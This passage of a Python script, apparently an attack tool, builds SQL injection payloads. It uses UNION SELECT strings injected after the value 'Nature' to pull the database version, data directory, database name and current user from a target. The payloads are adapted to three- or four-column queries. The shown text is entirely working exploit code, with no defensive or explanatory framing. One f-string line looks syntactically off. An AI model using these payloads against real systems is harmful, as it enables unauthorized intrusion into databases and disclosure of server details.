        f"Nature' UNION SELECT version(),database(),user(){'',''*(cols-3)}#",
        f"Nature' UNION SELECT @@version,@@datadir,current_user(){'',''*(cols-3)}#",
    ]
    
    for i, payload in enumerate(info_payloads):
        if cols == 3:
            if i == 0:
                payload = "Nature' UNION SELECT version(),database(),user()#"
            else:
                payload = "Nature' UNION SELECT @@version,@@datadir,current_user()#"
        elif cols == 4:
            if i == 0:
                payload = "Nature' UNION SELECT version(),database(),user(),4#"
            else:
                payload = "Nature' UNION SELECT @@version,@@datadir,current_user(),4#"
